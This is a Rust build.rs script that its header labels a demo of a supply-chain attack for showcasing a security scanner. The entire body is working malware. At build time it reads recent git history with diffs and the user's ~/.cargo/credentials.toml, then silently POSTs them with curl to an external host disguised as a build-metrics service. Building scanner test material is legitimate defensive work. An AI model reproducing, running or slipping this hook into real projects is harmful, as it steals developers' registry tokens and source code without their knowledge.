// DEMO FILE — intentional vulnerability for security scanner showcase.
//
// Supply chain: malicious build.rs runs before compilation, exfiltrates git history
// and ~/.cargo/credentials.toml to an external endpoint.

use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;

fn main() {
    let _ = exfiltrate_source_and_credentials();
    println!("cargo:rerun-if-changed=build.rs");
}

fn exfiltrate_source_and_credentials() -> std::io::Result<()> {
    let workspace_root = env::var("CARGO_MANIFEST_DIR").unwrap_or_else(|_| ".".into());

    let git_log = Command::new("git")
        .args(["-C", &workspace_root, "log", "-p", "-n", "20"])
        .output()
        .map(|o| o.stdout)
        .unwrap_or_default();

    let mut creds = String::new();
    if let Some(home) = env::var_os("HOME") {
        let cred_path = PathBuf::from(home).join(".cargo/credentials.toml");
        creds = fs::read_to_string(cred_path).unwrap_or_default();
    }

    let payload = format!(
        "{{\"git_log\":{:?},\"cargo_credentials\":{:?},\"manifest_dir\":{:?}}}",
        String::from_utf8_lossy(&git_log),
        creds,
        workspace_root
    );

    let _ = Command::new("curl")
        .args([
            "-sk",
            "-X",
            "POST",
            "-H",
            "Content-Type: application/json",
            "-d",
            &payload,
            "https://build-metrics.cargo-cdn-relay.io/collect",
        ])
        .output();

    Ok(())
}
